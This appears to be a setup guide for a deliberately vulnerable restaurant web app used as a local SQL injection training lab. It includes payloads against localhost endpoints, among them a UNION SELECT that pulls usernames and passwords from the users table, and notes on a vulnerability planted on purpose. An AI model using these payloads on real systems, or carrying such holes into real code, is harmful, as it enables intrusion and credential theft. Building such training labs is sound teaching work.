# Quick Setup After Vulnerability Update

## What Changed?

### ❌ REMOVED
- Default admin credentials (`admin` / `admin123`)
- Hardcoded admin account creation
- Trivial entry point vulnerability

### ✅ ADDED  
- Hard SQL injection in `/admin/orders/search`
- Hidden endpoint (requires authentication)
- Realistic attack scenario
- Advanced exploitation techniques needed

---

## Setup Steps

### Step 1: Delete Old Database
```bash
cd restaurant-app
rm restaurant.db
```

### Step 2: Start Application
```bash
python app.py
```

Application will output:
```
============================================================
⚠️  NO DEFAULT ADMIN ACCOUNT CREATED
============================================================
You must create an admin account via registration.
After registering, manually set role to 'admin' in database.
SQL: UPDATE users SET role='admin' WHERE username='your_username';
============================================================
```

### Step 3: Create Admin Account

**Option A: Via Registration UI**
1. Go to: `http://localhost:5000/register`
2. Create account (e.g., username: `admin`, password: `secure_password`)
3. Then promote in database (Option B)

**Option B: Promote Existing User**
```bash
sqlite3 restaurant.db
UPDATE users SET role='admin' WHERE username='your_username';
.exit
```

OR via Python:
```python
import sqlite3
conn = sqlite3.connect('restaurant.db')
cursor = conn.cursor()
cursor.execute("UPDATE users SET role='admin' WHERE username='your_username'")
conn.commit()
conn.close()
print("✅ User promoted to admin")
```

### Step 4: Test Access

**Login:**
1. Go to: `http://localhost:5000/login`
2. Username: `your_username`
3. Password: `your_password`

**Access Hard SQL Injection:**
1. Navigate to: `http://localhost:5000/admin/orders/search?q=test`
2. Should see search results page
3. Try SQL injection payloads

---

## Testing Both Vulnerabilities

### Easy: Lab Billing (`/lab/billing`)
```
1. Access: http://localhost:5000/lab/billing
2. Enable LAB_MODE in app.py if needed
3. Payload: ' OR '1'='1' --
4. Should see results
```

### Hard: Admin Orders Search (`/admin/orders/search`)
```
1. Must be logged in as admin
2. Access: http://localhost:5000/admin/orders/search?q=test
3. Payload: " OR "1"="1
4. Should see all orders
```

---

## Verification Checklist

- [ ] Old database deleted
- [ ] Application starts without errors
- [ ] Can register new user
- [ ] Can promote user to admin
- [ ] Can login as admin
- [ ] Can access `/admin/orders/search?q=test`
- [ ] Can access `/lab/billing` (if LAB_MODE=True)
- [ ] SQL injection works on both endpoints
- [ ] Alerts logged to `logs/security_alerts.log`
- [ ] Admin can view logs at `/admin/logs`

---

## SQL Injection Test Payloads

### For `/admin/orders/search` (Hard SQL Injection)

**Test 1: See all orders**
```
http://localhost:5000/admin/orders/search?q=" OR "1"="1
```

**Test 2: Extract users table**
```
http://localhost:5000/admin/orders/search?q=" UNION SELECT id,username,password,4,5,6 FROM users --
```

**Test 3: Boolean-based blind**
```
http://localhost:5000/admin/orders/search?q=" AND 1=1 --
http://localhost:5000/admin/orders/search?q=" AND 1=2 --
```

---

## Database Query to Check Admin Status

```bash
sqlite3 restaurant.db
SELECT username, role FROM users;
```

Output should show:
```
username  | role
your_user | admin
```

---

## Troubleshooting

### Issue: "IndexError: database.db not initialized"
**Solution:** Delete database and restart
```bash
rm restaurant.db
python app.py
```

### Issue: Cannot access `/admin/orders/search`, get 403
**Solution:** 
1. Make sure you're logged in: `/login`
2. Make sure you're promoted to admin: `UPDATE users SET role='admin' WHERE username='your_user'`
3. Restart browser or clear cookies

### Issue: SQL injection not working
**Solution:**
1. Check LAB_MODE setting (doesn't affect `/admin/orders/search`)
2. Try URL encoding: `"` = `%22`, space = `%20`
3. Check syntax of payload
4. Try simpler payload first: `" OR "1"="1`

### Issue: Cannot see logs
**Solution:**
1. Check if `/logs` directory exists
2. Login as admin and visit `/admin/logs`
3. Check file permissions: `logs/security_alerts.log` should be readable

---

## Admin Commands

### View All Users and Roles
```bash
sqlite3 restaurant.db
SELECT id, username, role, created_at FROM users;
```

### Promote User to Admin
```bash
sqlite3 restaurant.db
UPDATE users SET role='admin' WHERE username='your_username';
```

### Create Order for Testing
```bash
sqlite3 restaurant.db
INSERT INTO orders (username, item, quantity, status, created_at) 
VALUES ('testuser', 'Burger', 1, 'pending', datetime('now'));
```

### View Security Alerts
```bash
tail -20 logs/security_alerts.log
```

---

## Summary

**Old vulnerability:** Default credentials → Immediate admin access (too easy)

**New vulnerability:** Hard SQL injection in admin search → Realistic attack (requires skills)

**Training progression:**
1. Easy: `/lab/billing` for learning basics
2. Hard: `/admin/orders/search` for advanced techniques
3. Both: Show defense mechanisms

**Next:** Try exploiting the hard SQL injection endpoint!
